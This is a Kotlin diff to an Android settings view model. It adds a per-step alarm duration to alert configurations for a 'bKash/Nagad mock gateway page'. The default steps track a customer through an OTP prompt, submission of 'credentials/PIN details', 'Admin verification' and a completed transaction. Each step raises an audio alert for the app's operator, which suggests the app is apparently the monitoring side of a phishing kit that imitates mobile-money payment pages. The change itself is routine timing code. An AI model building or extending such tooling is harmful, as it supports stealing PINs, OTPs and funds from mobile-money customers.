@@ -18,7 +18,8 @@ data class TongConfig(
     val title: String,
     val subtitle: String,
     val isActive: Boolean,
-    val type: AudioAlertManager.AlarmType
+    val type: AudioAlertManager.AlarmType,
+    val durationSeconds: Int = 10
 )
  
 data class SettingsState(
@@ -119,26 +120,26 @@ class SettingsViewModel(application: Application) : AndroidViewModel(application
 
     private fun getDefaultTongs(): List<TongConfig> {
         return listOf(
-            TongConfig(0, "Step 0: Customer Enters Gateway", "Customers land on bKash/Nagad mock gateway page.", true, AudioAlertManager.AlarmType.SOFT_CHIME),
-            TongConfig(1, "Step 1: Verification OTP Prompted", "Customer requests authentication code via SMS.", true, AudioAlertManager.AlarmType.DIGITAL_BEEP),
-            TongConfig(2, "Step 2: Credential PIN Submit", "Customer submits credentials/PIN details.", true, AudioAlertManager.AlarmType.PHONE_RINGTONE),
-            TongConfig(3, "Step 3: Verification Processing", "Admin verification request pending cycle.", true, AudioAlertManager.AlarmType.DIGITAL_BEEP),
-            TongConfig(4, "Step 4: Transaction Successful 🎉", "Transaction completed and funds received.", true, AudioAlertManager.AlarmType.SOFT_CHIME)
+            TongConfig(0, "Step 0: Customer Enters Gateway", "Customers land on bKash/Nagad mock gateway page.", true, AudioAlertManager.AlarmType.SOFT_CHIME, 10),
+            TongConfig(1, "Step 1: Verification OTP Prompted", "Customer requests authentication code via SMS.", true, AudioAlertManager.AlarmType.DIGITAL_BEEP, 12),
+            TongConfig(2, "Step 2: Credential PIN Submit", "Customer submits credentials/PIN details.", true, AudioAlertManager.AlarmType.PHONE_RINGTONE, 15),
+            TongConfig(3, "Step 3: Verification Processing", "Admin verification request pending cycle.", true, AudioAlertManager.AlarmType.DIGITAL_BEEP, 10),
+            TongConfig(4, "Step 4: Transaction Successful 🎉", "Transaction completed and funds received.", true, AudioAlertManager.AlarmType.SOFT_CHIME, 10)
         )
     }
 
-    fun addTong(step: Int, title: String, subtitle: String, type: AudioAlertManager.AlarmType) {
+    fun addTong(step: Int, title: String, subtitle: String, type: AudioAlertManager.AlarmType, durationSeconds: Int = 10) {
         val currentTongs = _state.value.tongs.toMutableList()
         currentTongs.removeAll { it.step == step }
-        currentTongs.add(TongConfig(step, title, subtitle, true, type))
+        currentTongs.add(TongConfig(step, title, subtitle, true, type, durationSeconds))
         currentTongs.sortBy { it.step }
         saveTongsToPrefs(currentTongs)
     }
 
-    fun editTong(step: Int, title: String, subtitle: String, type: AudioAlertManager.AlarmType) {
+    fun editTong(step: Int, title: String, subtitle: String, type: AudioAlertManager.AlarmType, durationSeconds: Int = 10) {
         val currentTongs = _state.value.tongs.map {
             if (it.step == step) {
-                it.copy(title = title, subtitle = subtitle, type = type)
+                it.copy(title = title, subtitle = subtitle, type = type, durationSeconds = durationSeconds)
             } else {
                 it
             }
